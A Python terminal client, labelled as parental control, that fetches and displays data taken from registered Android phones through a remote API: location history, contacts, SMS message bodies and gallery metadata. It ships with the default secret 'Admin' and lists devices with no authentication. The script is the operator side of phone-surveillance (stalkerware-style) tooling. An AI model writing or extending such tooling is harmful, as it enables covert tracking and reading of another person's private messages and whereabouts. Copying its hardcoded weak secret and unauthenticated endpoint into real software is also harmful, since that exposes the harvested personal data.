#!/usr/bin/env python3
import requests
import json
import os
import sys
from datetime import datetime

API_BASE_URL = os.environ.get("API_URL", "https://termux-control.vercel.app")
API_TOKEN = os.environ.get("SECRET_KEY", "Admin")


class TermuxController:
    def __init__(self):
        self.api_url = API_BASE_URL
        self.api_token = API_TOKEN
        self.headers = {"X-API-Token": self.api_token}
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self):
        self.clear_screen()
        print("=" * 50)
        print("       PARENT CONTROL - TERMUX CLIENT")
        print("=" * 50)
        print()
    
    def print_menu(self):
        print("\n[1] View Location History")
        print("[2] View Contacts")
        print("[3] View SMS Logs")
        print("[4] View Gallery Metadata")
        print("[5] View All Data")
        print("[6] List Registered Devices")
        print("[7] Set API Token")
        print("[8] Set API URL")
        print("[0] Exit")
        print()
    
    def make_request(self, endpoint, method="GET"):
        try:
            url = f"{self.api_url}{endpoint}"
            if method == "GET":
                response = requests.get(url, headers=self.headers)
            else:
                response = requests.post(url, headers=self.headers)
            
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 401:
                print("\n[ERROR] Invalid or missing API token!")
                print("Please set your API token using option [7]")
                return None
            else:
                print(f"\n[ERROR] Request failed: {response.status_code}")
                return None
        except requests.exceptions.ConnectionError:
            print(f"\n[ERROR] Cannot connect to API: {self.api_url}")
            print("Make sure the API server is running.")
            return None
        except Exception as e:
            print(f"\n[ERROR] {str(e)}")
            return None
    
    def view_locations(self):
        self.print_header()
        print("LOCATION HISTORY")
        print("-" * 50)
        
        data = self.make_request("/api/fetch/locations")
        if data and "locations" in data:
            locations = data["locations"]
            if not locations:
                print("No location data available.")
            else:
                for i, loc in enumerate(locations[-10:], 1):
                    print(f"\n[{i}] {loc.get('timestamp', 'N/A')}")
                    print(f"    Lat: {loc.get('latitude', 'N/A')}")
                    print(f"    Lng: {loc.get('longitude', 'N/A')}")
                    print(f"    Accuracy: {loc.get('accuracy', 'N/A')}m")
        
        input("\nPress Enter to continue...")
    
    def view_contacts(self):
        self.print_header()
        print("CONTACTS")
        print("-" * 50)
        
        data = self.make_request("/api/fetch/contacts")
        if data and "contacts" in data:
            contacts_data = data["contacts"]
            if not contacts_data or not contacts_data.get("data"):
                print("No contacts data available.")
            else:
                contacts = contacts_data.get("data", [])
                print(f"Last updated: {contacts_data.get('updated_at', 'N/A')}")
                print(f"Total contacts: {len(contacts)}\n")
                
                for i, contact in enumerate(contacts[:20], 1):
                    print(f"[{i}] {contact.get('name', 'Unknown')}")
                    print(f"    Phone: {contact.get('phone', 'N/A')}")
                    print(f"    Email: {contact.get('email', 'N/A')}")
                    print()
        
        input("\nPress Enter to continue...")
    
    def view_sms(self):
        self.print_header()
        print("SMS LOGS")
        print("-" * 50)
        
        data = self.make_request("/api/fetch/sms")
        if data and "sms" in data:
            sms_list = data["sms"]
            if not sms_list:
                print("No SMS data available.")
            else:
                print(f"Total messages: {len(sms_list)}\n")
                
                for i, sms in enumerate(sms_list[-15:], 1):
                    msg_type = "SENT" if sms.get("type") == "sent" else "RECEIVED"
                    print(f"[{i}] [{msg_type}] {sms.get('address', 'Unknown')}")
                    print(f"    Date: {sms.get('date', 'N/A')}")
                    print(f"    Body: {sms.get('body', '')[:50]}...")
                    print()
        
        input("\nPress Enter to continue...")
    
    def view_gallery(self):
        self.print_header()
        print("GALLERY METADATA")
        print("-" * 50)
        
        data = self.make_request("/api/fetch/gallery")
        if data and "gallery" in data:
            gallery_data = data["gallery"]
            if not gallery_data or not gallery_data.get("data"):
                print("No gallery data available.")
            else:
                items = gallery_data.get("data", [])
                print(f"Last updated: {gallery_data.get('updated_at', 'N/A')}")
                print(f"Total items: {len(items)}\n")
                
                for i, item in enumerate(items[:20], 1):
                    print(f"[{i}] {item.get('filename', 'Unknown')}")
                    print(f"    Type: {item.get('type', 'N/A')}")
                    print(f"    Size: {item.get('size', 'N/A')}")
                    print(f"    Date: {item.get('date_taken', 'N/A')}")
                    print()
        
        input("\nPress Enter to continue...")
    
    def view_all_data(self):
        self.print_header()
        print("ALL DATA SUMMARY")
        print("-" * 50)
        
        data = self.make_request("/api/fetch/all")
        if data:
            print(f"\nDevice ID: {data.get('device_id', 'N/A')}")
            
            device_info = data.get('device_info', {})
            print(f"Device Name: {device_info.get('name', 'N/A')}")
            print(f"Model: {device_info.get('model', 'N/A')}")
            print(f"Android: {device_info.get('android_version', 'N/A')}")
            
            print(f"\nLocations: {len(data.get('locations', []))} entries")
            
            contacts = data.get('contacts', {})
            print(f"Contacts: {len(contacts.get('data', []))} entries")
            
            print(f"SMS: {len(data.get('sms', []))} entries")
            
            gallery = data.get('gallery', {})
            print(f"Gallery: {len(gallery.get('data', []))} entries")
        
        input("\nPress Enter to continue...")
    
    def list_devices(self):
        self.print_header()
        print("REGISTERED DEVICES")
        print("-" * 50)
        
        try:
            response = requests.get(f"{self.api_url}/api/devices")
            if response.status_code == 200:
                data = response.json()
                devices = data.get("devices", [])
                
                if not devices:
                    print("No devices registered.")
                else:
                    for i, device in enumerate(devices, 1):
                        print(f"\n[{i}] {device.get('name', 'Unknown')}")
                        print(f"    ID: {device.get('device_id', 'N/A')}")
                        print(f"    Model: {device.get('model', 'N/A')}")
                        print(f"    Registered: {device.get('registered_at', 'N/A')}")
        except Exception as e:
            print(f"Error: {str(e)}")
        
        input("\nPress Enter to continue...")
    
    def set_api_token(self):
        self.print_header()
        print("SET API TOKEN")
        print("-" * 50)
        print(f"Current token: {self.api_token[:10]}..." if self.api_token else "No token set")
        print()
        
        token = input("Enter new API token (or press Enter to cancel): ").strip()
        if token:
            self.api_token = token
            self.headers = {"X-API-Token": self.api_token}
            print("\nAPI token updated!")
        else:
            print("\nCancelled.")
        
        input("Press Enter to continue...")
    
    def set_api_url(self):
        self.print_header()
        print("SET API URL")
        print("-" * 50)
        print(f"Current URL: {self.api_url}")
        print()
        
        url = input("Enter new API URL (or press Enter to cancel): ").strip()
        if url:
            self.api_url = url
            print("\nAPI URL updated!")
        else:
            print("\nCancelled.")
        
        input("Press Enter to continue...")
    
    def run(self):
        while True:
            self.print_header()
            self.print_menu()
            
            choice = input("Select option: ").strip()
            
            if choice == "1":
                self.view_locations()
            elif choice == "2":
                self.view_contacts()
            elif choice == "3":
                self.view_sms()
            elif choice == "4":
                self.view_gallery()
            elif choice == "5":
                self.view_all_data()
            elif choice == "6":
                self.list_devices()
            elif choice == "7":
                self.set_api_token()
            elif choice == "8":
                self.set_api_url()
            elif choice == "0":
                self.clear_screen()
                print("Goodbye!")
                sys.exit(0)
            else:
                print("\nInvalid option. Please try again.")
                input("Press Enter to continue...")


if __name__ == "__main__":
    controller = TermuxController()
    controller.run()
